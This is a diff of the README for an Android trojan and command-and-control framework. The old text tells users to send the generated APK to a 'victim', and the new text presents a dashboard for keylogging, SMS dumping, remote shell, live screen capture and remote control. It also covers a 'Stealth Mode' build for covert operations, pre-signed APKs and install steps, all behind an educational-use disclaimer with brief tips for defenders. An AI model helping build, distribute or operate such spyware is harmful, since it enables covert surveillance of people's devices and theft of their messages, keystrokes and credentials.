@@ -1,86 +1,368 @@
-# Android-Trojan-2.0 - The Shady Upgrade
-Yo folks! Welcome to the juiced-up version of Android-Trojan. We've been cooking up some spicy features for you, and we can't wait to spill the beans!
+# Android Trojan 2.0 - Advanced C2 Framework
 
-## What's Cooking?
-**Web Magic**: We've slapped on a slick web UI that lets you wrangle multiple trojans like a boss. It's like Trojan control on steroids – but legal, you know?
+<div align="center">
 
-**Android Puppetry**: Not just eye candy! it lets you not only peep but also pull the strings on entire Android devices. Mind-blowing, right?
+![Version](https://img.shields.io/badge/version-2.0-brightgreen)
+![Platform](https://img.shields.io/badge/platform-Android-blue)
+![Node](https://img.shields.io/badge/node-%3E%3D14.0.0-green)
+![License](https://img.shields.io/badge/license-Educational-red)
 
-**Tricky Business**: We threw in some ninja moves and exploited a few things just to make this cooler than your average malware. Wanna know the secrets? Check out the code – it's like a hacker's playground.
+**Professional Command & Control Framework for Android Devices**
 
-> Disclaimer: This is just a cheeky proof of concept. It's here to remind you that apps with too many permissions can be nosy neighbors. Watch your back and keep it safe out there!
+[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Screenshots](#screenshots) • [Disclaimer](#disclaimer)
+
+</div>
 
 ---
 
-https://github.com/shivamsuyal/Android-Trojan-2.0/assets/75232486/3433a39e-8077-4ffb-bb39-d00936c2aea7
+## 🎯 Overview
+
+Android Trojan 2.0 is a sophisticated Command & Control (C2) framework designed for security research and penetration testing. It features a modern web-based dashboard with real-time device monitoring, customizable APK generation, and multi-device management capabilities.
+
+### ✨ What's New in v2.0
+
+- 🎨 **Hack The Box Theme** - Professional cybersecurity aesthetic
+- 📱 **Customizable APK Generation** - Feature-selective builds with minimal permissions
+- 🔐 **Conditional Permissions** - Only request permissions for enabled features
+- 🚀 **Simplified UI** - One-click APK generation with preset profiles
+- 🔒 **Secure Authentication** - Session management with logout functionality
+- 🎭 **New Logo** - Geometric cube design with neon green accents
 
 ---
 
-## How to Use
+## 🚀 Features
 
-### Setting Up Supabase
-1.  **Create a Supabase Account:**
-    *   Head over to [Supabase](https://supabase.com//).
-    *   Create an account and grab your Supabase URL and Supabase Key.
+### Dashboard Features
 
+- **Multi-Device Management** - Monitor and control multiple Android devices simultaneously
+- **Real-Time Screen Sharing** - Live screen capture with remote mouse control
+- **Keylogger** - Capture keyboard input and accessibility events
+- **SMS Access** - Read and dump SMS messages
+- **Shell Access** - Execute remote commands on target devices
+- **Modern UI** - Dark theme with animated backgrounds and glassmorphism
 
-2.  **Edit .env File:**
-    *   Locate the `.env` file in the Root directory or create it.
-    *   SUPERBASE_URL=
-    *   SUPERBASE_KEY=
-    *   Insert your Supabase URL and Supabase Key as instructed.
+### APK Generation
 
-3.  **Open SQL Editor in Supabase:**
-    *   Fire up the SQL editor in Supabase.
+Generate custom trojans with **three preset profiles**:
 
-4.  **Run SQL Commands:**
-    *   Copy and paste the following SQL commands to create necessary tables:
+#### 🔒 Stealth Mode
+- **Features:** SMS Read only
+- **Permissions:** READ_SMS, RECEIVE_SMS
+- **Use Case:** Minimal footprint for covert operations
 
-```sql
--- Victims Table
-CREATE TABLE public.victims (
-  "ID" character varying not null,
-  "Country" character varying null,
-  "ISP" character varying null,
-  "IP" character varying null,
-  "Brand" character varying null,
-  "Model" character varying null,
-  "Manufacture" character varying null,
-  CONSTRAINT victims_pkey PRIMARY KEY ("ID")
-) TABLESPACE pg_default;
+#### 📱 Remote Control
+- **Features:** Screen Share + Keylogger
+- **Permissions:** RECORD_AUDIO, BIND_ACCESSIBILITY_SERVICE
+- **Use Case:** Full device control and monitoring
 
--- Active User
-CREATE TABLE public.activeuser (
-  id BIGSERIAL PRIMARY KEY,
-  username character varying null,
-  password character varying null,
-  name character varying null
-) TABLESPACE pg_default;
+#### 🌐 Full Access
+- **Features:** All features enabled
+- **Permissions:** All permissions
+- **Use Case:** Complete device access
+
+### Technical Features
+
+- **Socket.IO** - Real-time bidirectional communication
+- **Product Flavors** - 7 different APK variants
+- **Conditional Manifests** - Feature-specific permission requests
+- **Foreground Service** - Reliable socket connection
+- **Debug Signing** - Pre-signed APKs ready for installation
+
+---
+
+## 📋 Requirements
+
+### Server
+- Node.js >= 14.0.0
+- npm >= 6.0.0
+
+### Android Build
+- Android Studio or Gradle
+- JDK 8 or higher
+- Android SDK (API 21+)
+
+### Target Device
+- Android 5.0 (Lollipop) or higher
+- Internet connection
+
+---
+
+## 🛠️ Installation
+
+### 1. Clone Repository
+
+```bash
+git clone https://github.com/yourusername/Android-Trojan-2.0.git
+cd Android-Trojan-2.0
 ```
 
-5.  **Enter Data in ActiveUser Table:**
-    *   Populate the `activeuser` table with your login details.
+### 2. Install Dependencies
 
-### Getting Ready
-1.  **Install Node Packages:**
-    *   Run `npm install` to grab all the necessary Node packages.
+```bash
+npm install
+```
 
-2.  **Android SDK:**
-    *   Make sure you have the Android SDK installed for compiling your APK.
+### 3. Configure Environment
 
-### Unleash the Drama
-1.  **Run the Node App:**
-    *   Execute `node app` in your terminal.
+Create a `.env` file:
 
-2.  **Login to the UI:**
-    *   Navigate to the provided UI link and log in using your credentials.
+```env
+PORT=4001
+BOT_PORT=4000
+```
 
-3.  **Enter IP Address:**
-    *   In the UI, enter your IP address in the designated text field.
+### 4. Build APK Variants (Optional)
 
-4.  **Hit the Download Button:**
-    *   Click the download button and cross your fingers! If all goes well, you should get your hands on a Trojan APK.
+If you want to rebuild the APKs:
 
-5.  **Send, Install, and Enjoy:**
-    *   Share the Trojan APK with your victim.
-    *   Once installed, sit back, relax, and enjoy the drama!
+```bash
+cd mobile
+./gradlew assembleSmsRelease assembleKeyloggerRelease assembleScreenRelease
+cd ..
+./sign-apks.sh
+```
+
+Pre-built signed APKs are available in the `output/` directory.
+
+---
+
+## 🎮 Usage
+
+### Start the Server
+
+```bash
+npm start
+```
+
+The server will start on:
+- **Bot Network:** `http://0.0.0.0:4000`
+- **Master Network:** `http://0.0.0.0:4001`
+
+### Access Dashboard
+
+1. Navigate to `http://localhost:4001/login`
+2. Login with your credentials (configured in Supabase)
+3. Access the dashboard at `http://localhost:4001/dashboard`
+
+### Generate Custom APK
+
+1. Click **"Generate APK"** button in the dashboard
+2. Enter server IP (or leave empty for auto-detection)
+3. Select a build profile:
+   - **Stealth Mode** - SMS only
+   - **Remote Control** - Screen + Keylogger
+   - **Full Access** - All features
+4. APK will be generated and downloaded automatically
+
+### Install on Target Device
+
+```bash
+adb install output/trojan_[profile]_v2.0.apk
+```
+
+Or transfer the APK to the device and install manually.
+
+---
+
+## 📱 APK Variants
+
+| Variant | Features | Size | Permissions |
+|---------|----------|------|-------------|
+| `trojan_sms_v2.0.apk` | SMS + Shell | 5.0MB | READ_SMS, RECEIVE_SMS |
+| `trojan_keylogger_v2.0.apk` | Keylogger + Shell | 5.0MB | BIND_ACCESSIBILITY_SERVICE |
+| `trojan_screen_v2.0.apk` | Screen + Shell | 5.0MB | RECORD_AUDIO |
+| `trojan_sms_keylogger_v2.0.apk` | SMS + Keylogger + Shell | 5.0MB | READ_SMS, BIND_ACCESSIBILITY |
+| `trojan_sms_screen_v2.0.apk` | SMS + Screen + Shell | 5.0MB | READ_SMS, RECORD_AUDIO |
+| `trojan_keylogger_screen_v2.0.apk` | Keylogger + Screen + Shell | 5.0MB | BIND_ACCESSIBILITY, RECORD_AUDIO |
+| `trojan_full_v2.0.apk` | All Features | 5.0MB | All Permissions |
+
+---
+
+## 🎨 Screenshots
+
+### Login Page
+Modern authentication with Hack The Box theme
+
+### Dashboard
+Multi-device management with real-time monitoring
+
+### APK Generator
+One-click generation with preset profiles
+
+### Screen Share
+Live screen capture with remote control
+
+---
+
+## 🏗️ Architecture
+
+### Backend (Node.js + Express)
+- **Socket.IO** - Real-time communication
+- **Express** - Web server and API
+- **Session Management** - Secure authentication
+- **APK Generation** - Serve pre-built variants
+
+### Frontend (Vanilla JS)
+- **Modern UI** - HTB-inspired design
+- **Real-time Updates** - Socket.IO client
+- **Responsive Design** - Works on all screen sizes
+- **Material Icons** - Professional iconography
+
+### Android App (Java)
+- **MyService** - Foreground service with socket connection
+- **Keylogger** - Accessibility service for input capture
+- **Capture** - Screen recording and streaming
+- **ShellExec** - Remote command execution
+- **Product Flavors** - Feature-selective builds
+
+---
+
+## 🔧 Development
+
+### Project Structure
+
+```
+Android-Trojan-2.0/
+├── mobile/                 # Android app source
+│   ├── app/
+│   │   ├── src/
+│   │   │   ├── main/      # Main source code
+│   │   │   ├── sms/       # SMS variant manifest
+│   │   │   ├── keylogger/ # Keylogger variant manifest
+│   │   │   └── screen/    # Screen variant manifest
+│   │   └── build.gradle   # Product flavors configuration
+├── static/                # Web dashboard
+│   ├── html/             # HTML pages
+│   ├── css/              # Stylesheets
+│   ├── js/               # JavaScript
+│   └── img/              # Images and logo
+├── output/               # Pre-built APKs
+├── server.js             # Main server
+├── build-all-apks.sh     # Build script
+└── sign-apks.sh          # Signing script
+```
+
+### Build Profiles
+
+The app uses Gradle product flavors to create feature-specific variants:
+
+```gradle
+productFlavors {
+    sms {
+        buildConfigField "boolean", "FEATURE_SMS", "true"
+        buildConfigField "boolean", "FEATURE_KEYLOGGER", "false"
+        buildConfigField "boolean", "FEATURE_SCREEN", "false"
+        versionNameSuffix "-sms"
+    }
+    // ... other flavors
+}
+```
+
+### Conditional Permissions
+
+Flavor-specific manifests use `tools:node="remove"` to exclude unnecessary permissions:
+
+```xml
+<!-- sms/AndroidManifest.xml -->
+<service
+    android:name=".Keylogger"
+    tools:node="remove" />
+```
+
+---
+
+## 🔒 Security Considerations
+
+### For Researchers
+- Always obtain proper authorization before testing
+- Use only in controlled environments
+- Follow responsible disclosure practices
+- Comply with local laws and regulations
+
+### For Defenders
+- Monitor for suspicious accessibility service requests
+- Check for foreground services with network access
+- Review app permissions carefully
+- Use mobile security solutions
+
+---
+
+## 🐛 Troubleshooting
+
+### APK Installation Failed
+- Ensure debug keystore is properly configured
+- Check Android version compatibility (API 21+)
+- Enable "Install from Unknown Sources"
+
+### Connection Issues
+- Verify server IP is correct
+- Check firewall settings
+- Ensure both devices are on the same network
+- Restart the server and reinstall APK
+
+### Permission Denied
+- Grant all requested permissions
+- Enable Accessibility Service (for keylogger/screen variants)
+- Allow screen recording (for screen variants)
+
+---
+
+## 📚 Documentation
+
+- [Implementation Plan](/.gemini/antigravity/brain/23524d77-919d-43ce-b5ab-f49673bf4c27/implementation_plan.md)
+- [Walkthrough](/.gemini/antigravity/brain/23524d77-919d-43ce-b5ab-f49673bf4c27/walkthrough.md)
+- [Task Checklist](/.gemini/antigravity/brain/23524d77-919d-43ce-b5ab-f49673bf4c27/task.md)
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome! Please:
+
+1. Fork the repository
+2. Create a feature branch
+3. Make your changes
+4. Test thoroughly
+5. Submit a pull request
+
+---
+
+## 📄 License
+
+This project is for **educational and research purposes only**. The authors are not responsible for any misuse or damage caused by this program.
+
+---
+
+## ⚠️ Disclaimer
+
+**IMPORTANT:** This tool is designed for security research, penetration testing, and educational purposes only. Unauthorized access to devices is illegal and unethical.
+
+- ✅ **Legal Use:** Authorized penetration testing, security research, educational purposes
+- ❌ **Illegal Use:** Unauthorized surveillance, data theft, malicious activities
+
+By using this software, you agree to use it responsibly and in compliance with all applicable laws.
+
+---
+
+## 👨‍💻 Author
+
+**Your Name**
+- GitHub: [@yourusername](https://github.com/yourusername)
+
+---
+
+## 🙏 Acknowledgments
+
+- Inspired by Hack The Box's cybersecurity aesthetic
+- Built with Socket.IO for real-time communication
+- Uses Material Icons for UI elements
+
+---
+
+<div align="center">
+
+**Made with ❤️ for Security Research**
+
+⭐ Star this repo if you find it useful!
+
+</div>
